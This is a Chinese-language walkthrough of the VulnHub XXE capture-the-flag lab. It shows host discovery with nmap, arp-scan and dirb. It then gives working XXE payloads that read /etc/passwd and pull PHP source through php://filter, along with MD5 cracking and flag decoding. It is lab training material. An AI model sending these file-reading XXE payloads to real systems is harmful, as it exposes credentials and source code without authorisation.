# XXE 打靶记录

> 编写于：2024-03-19



靶场下载地址：https://download.vulnhub.com/xxe/XXE.zip

这是一个虚拟机，所以需要用到 `VmWare`



## 1

先打开XXE靶场，此时虚拟机是锁着的，需要我们进行信息收集和操作才能登录。

因为XXE和我们的Kali在同一个局域网内，所以我们先看看Kali的IP地址：（`ifconfig`） (得到192.168.177.129)

打开Kali终端，切换成管理员（`su -`），扫IP（`nmap -sP 192.168.177.0/24 `）（前三位相同）

> namp -sP 1.1.1.0/24查看该网段下的存活（在线）的主机（0，1，255，254都不是，一般是kali的广播地址）

> 192.168.88.0/24，因为xxe虚拟机和kali是一个局域网的，所以前面三个数字都一样，只需要知道最后一个数字就行，那就是子网掩码为24

**结果如下：**

```
┌──(root㉿kali)-[~]
└─# nmap -sP 192.168.177.0/24

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-19 15:29 CST
Nmap scan report for 192.168.177.1
Host is up (0.0024s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.177.2
Host is up (0.0019s latency).
MAC Address: 00:50:56:F6:B2:84 (VMware)
Nmap scan report for 192.168.177.131
Host is up (0.0014s latency).
MAC Address: 00:0C:29:C1:C0:28 (VMware)
Nmap scan report for 192.168.177.254
Host is up (0.00056s latency).
MAC Address: 00:50:56:E4:4D:D7 (VMware)
Nmap scan report for 192.168.177.129
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.28 seconds

```

或者用Linux的`arp-scan`也行，（`arp-scan -l`）

**结果如下：**

```
┌──(root㉿kali)-[~]
└─# arp-scan -l                 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:fd:d2:9f, IPv4: 192.168.177.129
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.177.1   00:50:56:c0:00:08       VMware, Inc.
192.168.177.2   00:50:56:f6:b2:84       VMware, Inc.
192.168.177.131 00:0c:29:c1:c0:28       VMware, Inc.
192.168.177.254 00:50:56:e7:ae:65       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.447 seconds (104.62 hosts/sec). 4 responded

```

因为`0，1，255，254`这些边缘位置的一般是kali的广播地址，然后129是本机地址，所以就只剩下了131。



## 2

之后我们继续用nmap扫描开放的端口（`nmap 192.169.177.131`），

**结果如下：**

```
┌──(root㉿kali)-[~]
└─# nmap 192.168.177.131

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-19 15:36 CST
Nmap scan report for 192.168.177.131
Host is up (0.00075s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:C1:C0:28 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
```

只扫到了80端口，那我们就访问`192.168.177.131:80`，依旧什么都没有。



## 3

这时候没线索了，就去看看该IP下的文件目录

`dirb http://192.168.177.131/ -X .txt,.php,.zip`

扫描该ip下的`.txt`、`.php`、`.zip`后缀文件。

**结果如下：**

```
┌──(root㉿kali)-[~]
└─# dirb http://192.168.177.131/ -X .txt,.php,.zip

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Mar 19 15:43:01 2024
URL_BASE: http://192.168.177.131/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.txt,.php,.zip) | (.txt)(.php)(.zip) [NUM = 3]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.177.131/ ----
+ http://192.168.177.131/robots.txt (CODE:200|SIZE:76)                          
                                                                                
-----------------
END_TIME: Tue Mar 19 15:43:51 2024
DOWNLOADED: 13836 - FOUND: 1
```

扫描到了一个`robot.txt`文件，这是一个网络爬虫指示文件，那我们就访问看一看。

**内容如下：**

```
User-agent: *
Allow: /

User-Agent: *
Disallow: /xxe/*
Disallow: /admin.php
```

那我们就访问一下`/xxe/`和`/xxe/admin.php`。

得到了两个不同的登陆界面。

> PS：御剑、dirsearch等Web目录扫描工具也行。
>



## 4

**补充一下`/etc/passwd`：**

`/etc/passwd` 是Linux下的一个重要的文件，用于存储 Linux 系统中用户的基本属性和登录 Shell 的记录，但是里面的内容是加密过的，所以通常访问这个文件只是为了验证一下。



我们尝试登陆`/xxe/`，用Burp抓包，数据包如下：

```
POST /xxe/xxe.php HTTP/1.1
Host: 192.168.177.131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: text/plain;charset=UTF-8
Content-Length: 94
Origin: http://192.168.177.131
Connection: close
Referer: http://192.168.177.131/xxe/

<?xml version="1.0" encoding="UTF-8"?><root><name>admin</name><password>pass</password></root>
```

因为是XML提交的数据，所以我们测试一下，将以下内容替换原数据包中的XML部分。

```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "file:///etc/passwd">
]>
<root><name>&sp;</name><password>hj</password></root>

```

可以看到成功返回了`ect/passwd`的内容，说明存在XXE漏洞。



**解读一下这段XML代码：**

> 这段XML代码是一个简单的XML文档，用于表示数据。让我们逐行来解释它：
>
> 1. `<?xml version="1.0" ?>`: 这是XML声明，它指定了XML文档的版本。
>
> 2. `<!DOCTYPE r [`: 这是文档类型定义（Document Type Definition，DTD）的开始。它定义了XML文档中可以使用的元素以及它们的结构。
>
> 3. `<!ELEMENT r ANY >`: 这是DTD中的元素声明，它定义了名为"r"的元素。在这里，"r"元素被声明为可以包含任意内容。
>
> 4. `<!ENTITY sp SYSTEM "file:///etc/passwd">`: 这是DTD中的实体声明，它定义了名为"sp"的实体。在这里，"sp"实体被声明为引用了一个名为"file:///etc/passwd"的系统文件。
>
> 5. `<root>`: 这是XML文档中的根元素。
>
> 6. `<name>&sp;</name>`: 这是一个名为"name"的元素，其内容被定义为引用"sp"实体。因此，"name"元素的内容将被替换为"file:///etc/passwd"。
>
> 7. `<password>hj</password>`: 这是一个名为"password"的元素，其内容为"hj"。
>
> 8. `</root>`: 根元素的结束标签。
>
> 综上所述，该XML文档具有一个根元素"root"，其中包含了一个名为"name"的元素和一个名为"password"的元素。"name"元素的内容被替换为"file:///etc/passwd"，而"password"元素的内容为"hj"。请注意，"file:///etc/passwd"是一个指向系统中的文件路径，它可能包含有关用户的敏感信息。这段XML可能意图读取该文件的内容，并将敏感信息嵌入到XML文档中。这种行为可能会导致安全风险，因此在处理XML数据时应谨慎对待。



## 5

我们继续利用XXE漏洞，将XML部分替换为以下内容：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY admin SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php">
]>
<root><name>&admin;</name><password>admin</password></root>

```

**得到的关键数据如下：**

```php
<?php
$msg = '';
if (
    isset($_POST['login']) && !empty($_POST['username'])
    && !empty($_POST['password'])
) {

    if (
        $_POST['username'] == 'administhebest' &&
        md5($_POST['password']) == 'e6e061838856bf47e1de730719fb2609'
    ) {
        $_SESSION['valid'] = true;
        $_SESSION['timeout'] = time();
        $_SESSION['username'] = 'administhebest';

        echo "You have entered valid use name and password <br />";
        $flag = "Here is the <a style='color:FF0000;' href='/flagmeout.php'>Flag</a>";
        echo $flag;
    } else {
        $msg = 'Maybe Later';
    }
}

```

那我们就将密码MD5解码https://www.cmd5.com/，得到`admin@123`



## 6

因为是`/xxe/admin.php`页面返回来的结果，那我们就用账号：`administhebest`，密码：`admin@123`登陆一下。

登录之后页面有一个超链接，链接到`/flagmeout.php`，访问，直接NotFound了。

那我们就还是回到`/xxe/`，这次将`/flagmeout.php`用base64返回回来。

**XML如下：**

```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=flagmeout.php">
]>
<root><name>&sp;</name><password>hj</password></root>
```

**结果如下：**

```php
<?php
$flag = "<!-- the flag in (JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5) -->";
echo $flag;
?>
```

**接下来当然就是解码：**

因为全是大写所以猜测是base32编码，得到`L2V0Yy8uZmxhZy5waHA=`，再base64解码，得到`/etc/.flag.php`，其实直接`CyberChef`就行了



## 7

既然得到了`/etc/.flag.php`，那我们下一步当然就是访问它了。

**XML如下：**

```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "/etc/.flag.php">
]>
<root><name>&sp;</name><password>hj</password></root>
```

得到了一串很奇怪的码：

```
$_[]++;$_[]=$_._;$_____=$_[(++$__[])][(++$__[])+(++$__[])+(++$__[])];$_=$_[$_[+_]];$___=$__=$_[++$__[]];$____=$_=$_[+_];$_++;$_++;$_++;$_=$____.++$___.$___.++$_.$__.++$___;$__=$_;$_=$_____;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___=+_;$___.=$__;$___=++$_^$___[+_];$À=+_;$Á=$Â=$Ã=$Ä=$Æ=$È=$É=$Ê=$Ë=++$Á[];$Â++;$Ã++;$Ã++;$Ä++;$Ä++;$Ä++;$Æ++;$Æ++;$Æ++;$Æ++;$È++;$È++;$È++;$È++;$È++;$É++;$É++;$É++;$É++;$É++;$É++;$Ê++;$Ê++;$Ê++;$Ê++;$Ê++;$Ê++;$Ê++;$Ë++;$Ë++;$Ë++;$Ë++;$Ë++;$Ë++;$Ë++;$__('$_="'.$___.$Á.$Â.$Ã.$___.$Á.$À.$Á.$___.$Á.$À.$È.$___.$Á.$À.$Ã.$___.$Á.$Â.$Ã.$___.$Á.$Â.$À.$___.$Á.$É.$Ã.$___.$Á.$É.$À.$___.$Á.$É.$À.$___.$Á.$Ä.$Æ.$___.$Á.$Ã.$É.$___.$Á.$Æ.$Á.$___.$Á.$È.$Ã.$___.$Á.$Ã.$É.$___.$Á.$È.$Ã.$___.$Á.$Æ.$É.$___.$Á.$Ã.$É.$___.$Á.$Ä.$Æ.$___.$Á.$Ä.$Á.$___.$Á.$È.$Ã.$___.$Á.$É.$Á.$___.$Á.$É.$Æ.'"');$__($_);
```

猜测是PHP代码，那就找一些在线PHP运行网站，运行的时候记得再外边套上`<?php ?>`。

注意，在PHP7环境下运行不出flag，PHP5.6才行。**当然本地运行一下也行。**

https://code.y444.cn/php（这个网站可以切换PHP版本）



最终显示出了FLAG，`SAFCSP{xxe_is_so_easy}`

